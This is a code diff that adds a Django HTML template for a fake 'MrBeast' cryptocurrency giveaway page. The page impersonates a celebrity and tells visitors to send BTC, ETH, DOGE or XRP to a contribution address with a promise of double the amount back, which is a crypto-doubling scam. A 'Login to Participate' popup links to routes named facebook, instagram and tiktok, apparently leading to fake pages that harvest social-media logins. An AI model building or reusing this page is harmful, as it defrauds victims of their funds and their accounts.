@@ -1,0 +1,193 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/home.css' %}">
+    <link rel="shortcut icon" href="{% static 'images/MrBeastLogo.png' %}" type="image/x-icon">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" rel="stylesheet">
+    <script src="{% static 'scripts/script.js' %}"></script>
+    <title>Biggest CRYPTO giveaway of $100000000</title>
+    <style>
+        /* Popup background overlay */
+        .popup-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.6);
+            z-index: 1000;
+        }
+
+        .popup-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 10px;
+            width: 300px;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .popup-container h2 {
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            color: #333;
+        }
+
+        .popup-container .popup-button {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #3b5998; /* Facebook Blue */
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s;
+        }
+
+        .popup-container .popup-button:hover {
+            background-color: #2d4373;
+        }
+
+        .popup-container .popup-button i {
+            margin-right: 10px;
+        }
+
+        .popup-container .popup-button.instagram {
+            background-color: #E4405F; /* Instagram Pink */
+        }
+
+        .popup-container .popup-button.instagram:hover {
+            background-color: #C13584;
+        }
+
+        .popup-container .popup-button.tiktok {
+            background-color: #000000; /* TikTok Black */
+        }
+
+        .popup-container .popup-button.tiktok:hover {
+            background-color: #333;
+        }
+    </style>
+</head>
+<body>
+    <div id="main">
+        <nav>
+            <text class="mb">Mr Beast</text>
+            <div id="links">
+                <a href="#intro">Giveaway</a>
+                <a href="#rules">Info</a>
+                <a href="#instructions">Instruction</a>
+                <a href="#participate">Participate</a>
+                <a href="#transactions">Transactions</a>
+            </div>
+            <a class="p_button" href="javascript:void(0);" onclick="openPopup()">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+        </nav>
+
+        <header>
+            <div id="intro">
+                <span id="badge"><i class="fa-solid fa-circle-check"></i> Official Event</span>
+                <h1>BIGGEST CRYPTO GIVEAWAY<br>OF <text>$100 000 000</text></h1>
+                <article>
+                    During this unique event we will give you the opportunity to get
+                    <text>1,000 BTC</text> &amp; <text>10,000 ETH</text> &amp; 
+                    <text>100,000,000 DOGE</text> &amp; 
+                    <text>100,000,000 XRP</text>. 
+                    Have a look at the rules and don’t miss on your chance! You can only participate once!
+                </article>
+                <a class="p_button" href="javascript:void(0);" onclick="openPopup()" style="margin-top: 30px;">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+            </div>
+            <div id="intro_img">
+                <center><img src="{% static 'images/MrBeastLogo.png' %}"></center>
+            </div>
+        </header>
+
+        <section id="instructions">
+            <h2>Instruction For Participation</h2>
+            <div id="cards">
+                <div class="card">
+                    <i class="fas fa-regular fa-wallet" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    To participate you can do the transaction using any wallet or exchange!
+                </div>
+
+                <div class="card">
+                    <i class="fas fa-regular fa-right-left" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    Send the desired number of coins to the special address below.
+                </div>
+
+                <div class="card">
+                    <i class="fa-solid fa-circle-check" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    Once we receive your transaction, the doubled amount will be sent back to you immediately.
+                </div>
+
+                <div class="card">
+                    <i class="fas fa-regular fa-gift" style="color: rgb(227, 47, 77); font-size: 60px; margin-bottom: 15%;"></i>
+                    You can only take part in our giveaway once, hurry up!
+                </div>
+            </div>
+        </section>
+
+        <section id="rules">
+            <h2>Rules And Information</h2>
+            <div id="cards">
+                <div class="r_card">
+                    <h2>About Giveaway</h2>
+                    <article>
+                        We believe that BTC & ETH & DOGE & XRP will make the world more fair.
+                        To speed up the process of cryptocurrency mass adoption, 
+                        we decided to run 
+                        <text>1,000 BTC</text> & <text>10,000 ETH</text> & <text>100,000,000 DOGE</text> & <text>100,000,000 XRP</text> 
+                        giveaway for all crypto holders!
+                    </article>
+                </div>
+
+                <div class="r_card">
+                    <h2>How To Participate ?</h2>
+                    <article>                    
+                        To participate you just need to send any amount from <text>(0.1 BTC to 50 BTC) </text>
+                        or <text>(1 ETH to 500 ETH)</text> 
+                        or <text>(10,000 DOGE to 5,000,000 DOGE) </text>
+                        or <text>(2,500 XRP to 5,000,000 XRP)</text> to the contribution address, 
+                        and we will immediately send back the double amount <text>(0.2 BTC to 100 BTC) </text>
+                        or <text>(2 ETH to 1,000 ETH)</text> or <text>(20,000 DOGE to 10,000,000 DOGE)</text> 
+                        or <text>(5,000 XRP to 10,000,000 XRP) (x2)</text> to the address you sent it from
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <footer>
+            <text class="mb">Mr Beast</text>
+            <a class="p_button" href="javascript:void(0);" onclick="openPopup()">Participate <i class="fas fa-regular fa-arrow-right"></i></a>
+        </footer>
+    </div>
+
+    <!-- Popup Section -->
+    <div class="popup-overlay" id="popup">
+        <div class="popup-container">
+            <h2>Login to Participate</h2>
+            <a href="{% url 'facebook' %}" class="popup-button"><i class="fab fa-facebook"></i> Log in with Facebook</a>
+            <a href="{% url 'instagram' %}" class="popup-button instagram"><i class="fab fa-instagram"></i> Log in with Instagram</a>
+            <a href="{% url 'tiktok' %}" class="popup-button tiktok"><i class="fab fa-tiktok"></i> Log in with TikTok</a>
+        </div>
+    </div>
+
+    <script>
+        function openPopup() {
+            document.getElementById("popup").style.display = "block";
+        }
+    </script>
+</body>
+</html>
